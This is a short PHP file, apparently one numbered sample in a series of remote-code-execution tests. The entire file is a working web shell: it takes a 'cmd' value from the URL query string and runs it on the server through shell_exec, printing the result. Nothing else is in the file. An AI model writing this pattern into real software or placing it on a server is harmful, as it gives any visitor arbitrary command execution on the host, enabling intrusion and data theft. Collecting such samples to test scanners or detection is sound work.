<?php
// RCE test variation #1062
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>